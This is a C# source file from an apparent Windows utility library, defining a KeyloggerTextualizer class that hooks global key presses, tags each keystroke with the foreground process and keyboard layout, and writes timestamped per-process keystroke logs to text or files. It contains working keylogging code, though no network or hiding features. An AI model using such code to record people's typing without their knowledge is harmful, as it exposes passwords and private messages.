using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using nucs.Windows.Processes;

namespace nucs.Windows.Keyboard.Highlevel {

    [Serializable]
    public class KeyloggerTextualizer : IKeylogTexualizer {
        public event Action<LoggedLine> LineClosed;
        private readonly KeyboardLogger kbl;
        public KeyloggerTextualizer(bool IsConsoleApp = false) {
            kbl = new KeyboardLogger(IsConsoleApp);
            kbl.KeyPress += OnKeyPress;
        }

        public event KeyEventHandler KeyPress {
            add { kbl.KeyPress += value; }
            remove { kbl.KeyPress -= value; }
        }

        public event KeyEventHandler KeyUp {
            add { kbl.KeyUp += value; }
            remove { kbl.KeyUp -= value; }
        }

        public event KeyEventHandler KeyDown {
            add { kbl.KeyDown += value; }
            remove { kbl.KeyDown -= value; }
        }

        /// <summary>
        /// Disable multiple (basically a spam) of firing button down event. True by default.
        /// </summary>
        public bool SuppressKeyHold {
            get { return kbl.SuppressKeyHold; }
            set { kbl.SuppressKeyHold = value; }
        }

        /// <summary>
        ///     If there is any logged data in records.
        /// </summary>
        public bool HasRecords { get { return ActiveLogs.Any(pl => pl.Logs.Count>0); } }

        /// <summary>
        ///     For serializing purposes, won't actually log.
        /// </summary>
        private KeyloggerTextualizer() : this(false) { }

        public List<ProcessLog> ActiveLogs { get; } = new List<ProcessLog>();

        /// <summary>
        ///     Handles a key press event
        /// </summary>
        private void OnKeyPress(BaseKeyboardManager sender, HotkeyEventArgs args) {
            //handles which process was it hit on,

            var topmost = ProcessFinder.GetForegroundProcess().ToProcessInfo();

            var topmost_log = ActiveLogs.FirstOrDefault(log => log.Process.Equals(topmost));
            if (topmost_log == null) {
                ActiveLogs.Add(topmost_log = new ProcessLog() {Process = topmost});
                topmost_log.LineClosed += line => LineClosed?.Invoke(line);
            }
            //Convert Hotkey to LogKey - includes in keyboardlayout
            var lk = new LogKey { Key = args.Hotkey.Key, Modifiers = args.Hotkey.Modifiers, KeyboardLayout = KeyboardLanguage.GetCurrentKeyboardLayout() }; //67699721 hebrew?
            topmost_log.AddContent(lk);
        }

        /// <summary>
        /// Load logs from another textualizer to this. used to merge deserialized textualizer with an active one.
        /// </summary>
        public void LoadHistory(IKeylogTexualizer logs) {
            LoadHistory(logs.ActiveLogs);
        }

        /// <summary>
        /// Load logs from another textualizer to this. used to merge deserialized textualizer with an active one.
        /// </summary>
        public void LoadHistory(List<ProcessLog> logs) {
            var existing = logs.Where(nl => ActiveLogs.Any(ol => ol.Process.Equals(nl.Process))).ToArray();
            var nonex = logs.Except(existing);
            ActiveLogs.AddRange(nonex);
            foreach (var nl in existing) {
                ActiveLogs.FirstOrDefault(ol=>ol.Process==nl.Process)?.Logs.AddRange(nl.Logs);
            }
        }

        /// <summary>
        ///     Clears all of the lines recorded up to now except for the active rows.
        /// </summary>
        public void Clear() {
            ActiveLogs.ForEach(logs => logs.Logs.RemoveWhere(line => line.EndRecord != null && line.EndRecord != DateTime.MinValue));
        }

        /// <summary>
        ///     Clears all of the lines recorded up to now including still recording rows.
        /// </summary>
        public void ClearAll() {
            ActiveLogs.ForEach(logs => logs.Logs.Clear());
        }

        public virtual string Output() {
            var sb = new StringBuilder();
            foreach (var p in ActiveLogs.ToArray()) {
                sb.AppendLine("---Process: " + p.Process.Name);
                foreach (var line in p.Logs) {
                    sb.AppendLine($"[{line.EndRecord?.ToString("s")??line.StartRecord?.ToString("s")??""}]"+line.ToStringKeyGuide());
                }
            }
            return sb.ToString();
        }
        
        public void Output(FileInfo fi, bool append=false) {
            Output().SaveAs(fi,append);
        }
        public void Output(FileStream fi, bool append=false) {
            var txt = Encoding.UTF8.GetBytes(Output());
            if (!append)
                fi.SetLength(0);
            fi.Write(txt, 0, txt.Length);
            fi.Flush();
        }
    }
}